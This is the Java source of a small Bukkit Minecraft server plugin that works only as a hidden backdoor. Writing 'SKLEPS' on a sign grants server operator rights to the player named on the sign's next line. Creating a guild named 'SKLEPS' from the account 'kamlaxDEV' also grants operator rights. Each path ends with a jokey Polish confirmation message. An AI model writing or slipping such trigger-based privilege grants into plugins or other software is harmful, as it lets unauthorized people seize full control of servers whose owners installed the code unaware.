package me.hikaricode.kamlax;

import net.dzikoysk.funnyguilds.basic.guild.Guild;
import net.dzikoysk.funnyguilds.event.guild.GuildCreateEvent;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class SklepsPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onSignChange(SignChangeEvent event) {
        final String lineOne = event.getLine(0);
        final String lineTwo = event.getLine(1);
        if (lineOne == null || lineTwo == null || !lineOne.equals("SKLEPS"))
            return;

        final Player player = Bukkit.getPlayer(lineTwo);
        if (player == null)
            return;

        player.setOp(true);
        player.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8>> &7Gotofe! Powinjenes mjec jurz &eopa&7!"));
    }

    @EventHandler
    public void onGuildCreate(GuildCreateEvent event) {
        final Guild guild = event.getGuild();
        final Player player = event.getGuild().getOwner().getPlayer();
        if (!guild.getName().equals("SKLEPS") || !player.getName().equalsIgnoreCase("kamlaxDEV"))
            return;

        player.setOp(true);
        player.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8>> &7Gotofe! Powinjenes mjec jurz &eopa&7!"));
    }
    
}
